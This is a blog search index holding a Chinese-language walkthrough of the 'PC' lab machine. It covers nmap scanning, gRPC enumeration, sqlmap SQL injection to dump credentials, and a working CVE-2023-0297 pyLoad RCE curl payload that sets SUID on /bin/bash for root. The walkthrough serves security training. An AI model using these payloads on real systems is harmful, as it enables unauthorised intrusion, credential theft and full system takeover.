<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/06/e19f8e21a5c3.html"/>
    <url>/2023/06/e19f8e21a5c3.html</url>
    
    <content type="html"><![CDATA[<h1 id="Linux-提权"><a href="#Linux-提权" class="headerlink" title="Linux 提权"></a>Linux 提权</h1><h2 id="原理和枚举"><a href="#原理和枚举" class="headerlink" title="原理和枚举"></a>原理和枚举</h2><p>提权:Privilege Escalation,PrivEsca,PE<br>常见的权限体系：</p><ul><li>ugo</li><li>suid,sgid</li><li>Capabilities</li><li>AppArmor Selinux</li><li>ACL</li></ul><p>不常见的权限体系;</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PC靶机</title>
    <link href="/2023/05/8697a8337304.html"/>
    <url>/2023/05/8697a8337304.html</url>
    
    <content type="html"><![CDATA[<p>本身并不是特别难的靶机，但是在 getshell 的过程中，需要足够的信息收集能力，提权的过程也并不复杂，不过需要一定的经验。</p><h1 id="PC-靶机"><a href="#PC-靶机" class="headerlink" title="PC 靶机"></a>PC 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads]<br>└─$ sudo nmap -sT -sV -O -p22,50051 10.10.11.214<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 07:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.214<br>Host is up (0.0034s latency).<br><br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)<br>50051/tcp open  unknown<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port50051-TCP:V=7.93%I=7%D=5/31%Time=64772F74%P=x86_64-pc-linux-gnu%r(N<br>SF:ULL,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0</span><br><span class="hljs-string">SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(Generic<br>SF:Lines,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\</span><br><span class="hljs-string">SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(GetRe<br>SF:quest,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\</span><br><span class="hljs-string">SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(HTTPO<br>SF:ptions,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0</span><br><span class="hljs-string">SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(RTSP<br>SF:Request,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\</span><br><span class="hljs-string">SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(RPC<br>SF:Check,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\</span><br><span class="hljs-string">SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&quot;</span>)%r(DNSVe<br>SF:rsionBindReqTCP,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\</span><br><span class="hljs-string">SF:xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0</span><br><span class="hljs-string">SF:&quot;</span>)%r(DNSStatusRequestTCP,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0</span><br><span class="hljs-string">SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\</span><br><span class="hljs-string">SF:0\0\?\0\0&quot;</span>)%r(Help,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0</span><br><span class="hljs-string">SF:\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\</span><br><span class="hljs-string">SF:0\0&quot;</span>)%r(SSLSessionReq,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0</span><br><span class="hljs-string">SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0</span><br><span class="hljs-string">SF:\?\0\0&quot;</span>)%r(TerminalServerCookie,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf</span><br><span class="hljs-string">SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0</span><br><span class="hljs-string">SF:\0\0\0\0\0\?\0\0&quot;</span>)%r(TLSSessionReq,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?</span><br><span class="hljs-string">SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0</span><br><span class="hljs-string">SF:8\0\0\0\0\0\0\?\0\0&quot;</span>)%r(Kerberos,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x</span><br><span class="hljs-string">SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\</span><br><span class="hljs-string">SF:0\0\0\0\0\0\?\0\0&quot;</span>)%r(SMBProgNeg,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x</span><br><span class="hljs-string">SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\</span><br><span class="hljs-string">SF:0\0\0\0\0\0\?\0\0&quot;</span>)%r(X11Probe,2E,<span class="hljs-string">&quot;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff</span><br><span class="hljs-string">SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\</span><br><span class="hljs-string">SF:0\0\0\0\0\?\0\0&quot;</span>);<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose|specialized<br>Running (JUST GUESSING): Linux 5.X|4.X|2.6.X (98%), Crestron 2-Series (90%)<br>OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:crestron:2_series<br>Aggressive OS guesses: Linux 5.0 (98%), Linux 4.15 - 5.6 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 2.6.32 (91%), Linux 5.0 - 5.3 (90%), Linux 5.4 (90%), Crestron XPanel control system (90%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.32 seconds<br></code></pre></td></tr></table></figure><p>22 端口 ssh 服务的渗透优先级较低，50051 的服务并没有被识别出来，漏洞脚本扫描也失败。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads]<br>└─$ sudo nmap --script=vuln -p22,50051 10.10.11.214<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 07:30 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.214<br>Host is up (0.0035s latency).<br><br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>50051/tcp open  unknown<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.69 seconds<br></code></pre></td></tr></table></figure><p>只能借助于网络搜索了，查了一下，50051 大概率是 gRPC 服务，博客末尾附上 gRPC 的详解。这里简单介绍一下，gRPC 是谷歌发起的一个开源远程过程调用系统，基于 HTTP&#x2F;2 协议传输</p><blockquote><p>在 gPRC 里客户端可以向调用本地对象一样直接调用另一台不同机器上服务端应用的方法，使得您能够更容易地创建分布式应用和服务。</p></blockquote><p>在如何利用 gPRC 方面，找到了一篇博客：<a href="https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9">gRPC Security Series: Part 3. Security Vulnerabilities in gRPC | by IBM PTC Security | Medium</a></p><p>博客中涉及几个工具和环境，包括：go 环境、grpcurl、grpcui、Burpsuite。grpcurl 和 grpcui 的安装使用 go install 命令即可，在不指定环境变量中的路径的情况下，go get 安装的工具会放在用户目录下的 go&#x2F;bin 文件夹里。关于安装时参考了这篇文章：<a href="https://princepereira.medium.com/install-grpccurl-in-ubuntu-6ad71fd3ed31">Install grpccurl in Ubuntu. grpcurl is a command-line tool that… | by Prince Pereira | Medium</a></p><h2 id="端口渗透"><a href="#端口渗透" class="headerlink" title="端口渗透"></a>端口渗透</h2><p>接下来就是按照博客中的提示，逐步去尝试的过程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/go/bin]<br>└─$ ./grpcurl -plaintext 10.10.11.214:50051 list<br>SimpleApp<br>grpc.reflection.v1alpha.ServerReflection<br><br>┌──(i3eg1nner㉿minilite)-[~/go/bin]<br>└─$ ./grpcurl -plaintext 10.10.11.214:50051 list SimpleApp<br>SimpleApp.LoginUser<br>SimpleApp.RegisterUser<br>SimpleApp.getInfo<br></code></pre></td></tr></table></figure><p>通过 grpcurl 工具查看了服务，接下来需要使用 grpcui 来在网页端查看，这个网页中的功能框由三个功能可以切换，分别是 LoginUser,RegisterUser,getInfo，在使用 getInfo 的时候，返回信息是没有 token，那我们先注册一下吧。除此之外需要注意得是，注册后一段时间，账户信息会自动清除，操作必须迅速一些，下图是注册信息</p><p><img src="/pic/7f71a2afc501e4da08e13d6d3c7fdfd0_MD5.png"></p><p>注册后返回了注册成功，登录后返回 id 和 token，注意这里我们关注的是 token 中单引号之间内容</p><p><img src="/pic/20069ceefb6d54632c3345300c47fd58_MD5.png"></p><p>getInfo 中输入 2 时返回的结果</p><p><img src="/pic/afe150636345e451f58bb2a09dace4c0_MD5.png"></p><p>getinfo 输入 1 时返回的结果</p><p><img src="/pic/2675756667f5206e2f7e06d978dc6c78_MD5.png"></p><h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><p>根据这个 token，我们尝试 getInfo 的功能，当输入非预期的字符的时候有报错，这就存在 SQL 注入的可能，接下来我们使用 burpsuite 抓包，然后另存为，将其保存下来以便使用sqlmap</p><p><img src="/pic/ad2202f8c5ec83c12ae9b0fa219f9de2_MD5.png"></p><p><code>sqlmap -r pc -p id</code></p><p><img src="/pic/e6cc60c03aa8cd6eb6ee2278b88d1192_MD5.png"></p><p><code>sqlmap -r pc -p id --tables</code></p><p><img src="/pic/fb265b18c76b3eb2c7fb30560c256672_MD5.png"></p><p><code>sqlmap -r pc -p id -D SQLite_masterdb -T accounts --columns</code></p><p><img src="/pic/41cd5c3a588aa898ec3ca3c96e02f55d_MD5.png"></p><p><code>sqlmap -r pc -p id -D SQLite_masterdb -T accounts --batch --threads 5 --dump</code></p><p><img src="/pic/064fd12e814a363df0baeb899283b747_MD5.png"></p><h2 id="获取初步-shell"><a href="#获取初步-shell" class="headerlink" title="获取初步 shell"></a>获取初步 shell</h2><p>得到了用户名和密码，接下来尝试 ssh 登录一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ ssh sau@10.10.11.214<br>The authenticity of host \&#x27;10.10.11.214 (10.10.11.214)&#x27; can&#x27;t be established.<br>ED25519 key fingerprint is SHA256:63yHg6metJY5dfzHxDVLi4Zpucku6SuRziVLenmSmZg.<br>This key is not known by any other names.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added &#x27;10.10.11.214&#x27; (ED25519) to the list of known hosts.<br>sau@10.10.11.214\&#x27;s password: <br>Last login: Wed May 31 06:48:37 2023 from 10.10.14.40<br>sau@pc:~$ whoami<br>sau<br>sau@pc:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    link/ether 00:50:56:b9:21:5e brd ff:ff:ff:ff:ff:ff<br>    inet 10.10.11.214/23 brd 10.10.11.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::250:56ff:feb9:215e/64 scope link <br>       valid_lft forever preferred_lft forever<br>sau@pc:~$ sudo -l<br>[sudo] password for sau: <br>Sorry, user sau may not run sudo on localhost.<br>sau@pc:~$ uname -a<br>Linux pc 5.4.0-148-generic #165-Ubuntu SMP Tue Apr 18 08:53:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录成功，接下来进行提权的操作，定时任务中没有有效信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">sau@pc:~$ <span class="hljs-built_in">id</span><br>uid=1001(sau) gid=1001(sau) <span class="hljs-built_in">groups</span>=1001(sau)<br>sau@pc:~$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br>17 ** * *root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6* * *root<span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6* * 7root<span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 61 * *root<span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>查看网络端口状态，发现 127.0.0.1:8000 端口跑了一个服务，那就考虑使用 SSH 隧道，在本地浏览器查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">sau@pc:~$ netstat -nat<br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State      <br>tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     <br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     <br>tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     <br>tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN     <br>tcp        0      0 10.10.11.214:22         10.10.14.40:53522       ESTABLISHED<br>tcp        0    208 10.10.11.214:22         10.10.14.30:47880       ESTABLISHED<br>tcp        0      0 10.10.11.214:22         10.10.14.40:44572       ESTABLISHED<br>tcp        0      0 10.10.11.214:22         10.10.16.8:38773        ESTABLISHED<br>tcp        0      0 10.10.11.214:22         10.10.16.8:36229        FIN_WAIT2  <br>tcp6       0      0 :::22                   :::*                    LISTEN     <br>tcp6       0      0 :::50051                :::*                    LISTEN     <br>tcp6       0      0 10.10.11.214:50051      10.10.14.30:39562       ESTABLISHED<br><br></code></pre></td></tr></table></figure><p>看起来是个后台登录界面，在谷歌上搜一下它的 exploit，发现存在一个 CVE 编号的代码执行漏洞</p><p><img src="/pic/dd4782deda7a8dd87b343539b71d1193_MD5.png"></p><h3 id="CVE-2023-0297-Pre-auth-RCE-in-pyLoad"><a href="#CVE-2023-0297-Pre-auth-RCE-in-pyLoad" class="headerlink" title="CVE-2023-0297: Pre-auth RCE in pyLoad"></a>CVE-2023-0297: Pre-auth RCE in pyLoad</h3><p><img src="/pic/17699193c4c6826b2369fedf6b8c272b_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i -s -k -X $<span class="hljs-string">&#x27;POST&#x27;</span> \<br>    --data-binary $<span class="hljs-string">&#x27;jk=pyimport%20os;os.system(\&quot;touch%20/tmp/pwnd\&quot;);f=function%20f2()&#123;&#125;;&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#x27;</span> \<br>    $<span class="hljs-string">&#x27;http://&lt;target&gt;/flash/addcrypted2&#x27;</span><br></code></pre></td></tr></table></figure><p>看一下 pyload 进程，发现是 root 权限在运行，也就是说接下来我们使用上面的 exp 中的代码执行，也是以 root 权限运行，那我们可以把 &#x2F;bin&#x2F;bash 改为 s 权限 <code>chmod u+s /bin/bash</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sau@pc:~$ ps aux |grep pyload<br>root        1043  0.0  1.4 1215780 58416 ?       Ssl  May31   0:08 /usr/bin/python3 /usr/local/bin/pyload<br>sau        21965  0.0  0.0   8160  2572 pts/0    S+   01:41   0:00 grep --color=auto pyload<br></code></pre></td></tr></table></figure><p>接下来就是运行上面的代码，值得注意的是，需要经过其中构造的希望被执行的代码只有 url 编码后，才能成功执行</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">curl -i -s -k -X $&#x27;POST<span class="hljs-string">&#x27; \</span><br><span class="hljs-string">    --data-binary $&#x27;</span>jk=pyimport%20os;os.system(\<span class="hljs-string">&quot;`chmod%20u%2Bs%20%2Fbin%2Fbash`&quot;</span>);f=function%20f2()&#123;&#125;;&amp;<span class="hljs-keyword">package</span>=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa<span class="hljs-string">&#x27; \</span><br><span class="hljs-string">    $&#x27;</span>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8000</span>/flash/addcrypted2<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">sau@pc:~$ curl -i -s -k -X $&#x27;POST&#x27; \<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">    --data-binary $<span class="hljs-string">&#x27;jk=pyimport%20os;os.system(\&quot;`chmod%20u%2Bs%20%2Fbin%2Fbash`&quot;);f=function%20f2()&#123;&#125;;&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#x27;</span> \</span><br><span class="language-bash">&gt;     $<span class="hljs-string">&#x27;http://127.0.0.1:8000/flash/addcrypted2&#x27;</span></span><br>HTTP/1.1 500 INTERNAL SERVER ERROR<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 21<br>Access-Control-Max-Age: 1800<br>Access-Control-Allow-Origin: *<br>Access-Control-Allow-Methods: OPTIONS, GET, POST<br>Vary: Accept-Encoding<br>Date: Thu, 01 Jun 2023 01:48:24 GMT<br>Server: Cheroot/8.6.0<br><br>Could not decrypt keysau@pc:~$ id<br>uid=1001(sau) gid=1001(sau) groups=1001(sau)<br>sau@pc:~$ /bin/bash -p<br>bash-5.0# id<br>uid=1001(sau) gid=1001(sau) euid=0(root) groups=1001(sau)<br><br></code></pre></td></tr></table></figure><p>提权成功</p><h2 id="gRPC-知识补充"><a href="#gRPC-知识补充" class="headerlink" title="gRPC 知识补充"></a>gRPC 知识补充</h2><p>主要参考博客：<a href="https://medium.com/@ibm_ptc_security/grpc-security-series-part-1-c0059362c4b5">gRPC Security Series: Part 1. Introduction to gRPC | by IBM PTC Security | Medium</a></p><p>gRPC 是一个开源高性能的远程过程调用（RPC）框架，支持 Binary framing ，并且因为使用的是支持多路复用的 HHTP&#x2F;2，因此传输更轻便时延较低。</p><blockquote><p>The core problem that <strong>gRPC</strong> is trying to solve is communication delay. gRPC uses HTTP&#x2F;2 as its transfer protocol</p></blockquote><p>![[pic&#x2F;Pasted image 20230601103729.png]]</p><p>Protobuf 文件是定义 gRPC 服务时的核心组件之一。客户端和服务器都需要具有相同的原型文件。proto 文件充当客户端从服务器调用任何可用函数的中间合约。</p><p>![[pic&#x2F;Pasted image 20230601104216.png]]</p><p>Protobuf 特定用途的架构将数据类型与字段名称相关联，使用整数来标识每个字段。Protobuf 数据仅包含数字，不包含字段名称，与在数据中包含字段名称的系统相比，可提供一些带宽&#x2F;存储节省。</p><p>常用工具：</p><ul><li>gRPC Curl</li><li>gRPC UI</li><li>Evans CLI</li><li>BloomRPC</li><li>Insomnia</li></ul><h3 id="grpcurl"><a href="#grpcurl" class="headerlink" title="grpcurl"></a>grpcurl</h3><p><code>grpcurl -plaintext localhost:50051 list</code></p><p>![[pic&#x2F;Pasted image 20230601105010.png]]</p><p>让我们尝试使用以下命令挖掘并找出博客服务中存在的服务 <code>grpcurl -plaintext localhost:50051 list blog.BlogService</code></p><p>![[pic&#x2F;Pasted image 20230601105106.png]]</p><p><code>grpcurl -plaintext localhost:50051 describe blog.BlogService.CreateBlog</code></p><p>![[pic&#x2F;Pasted image 20230601105141.png]]</p><p>要了解如何通过此模板传递数据，我们将使用以下命令使用 <strong>msg-template</strong> 标志</p><p>![[pic&#x2F;Pasted image 20230601105207.png]]</p><p>为了传递一些数据，我们需要使用 <strong>-d</strong> 标志。</p><p>![[pic&#x2F;Pasted image 20230601105224.png]]</p><h3 id="grpcui"><a href="#grpcui" class="headerlink" title="grpcui"></a>grpcui</h3><p>运行一个可以通过浏览器访问的本地实例，在随机自由端口中启动进程。</p><p>![[pic&#x2F;Pasted image 20230601105423.png]]</p><h2 id="SSH-退出登录命令"><a href="#SSH-退出登录命令" class="headerlink" title="SSH 退出登录命令"></a>SSH 退出登录命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">logout</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Malicious-URL-Detection</title>
    <link href="/2023/05/16333fe2a0dd.html"/>
    <url>/2023/05/16333fe2a0dd.html</url>
    
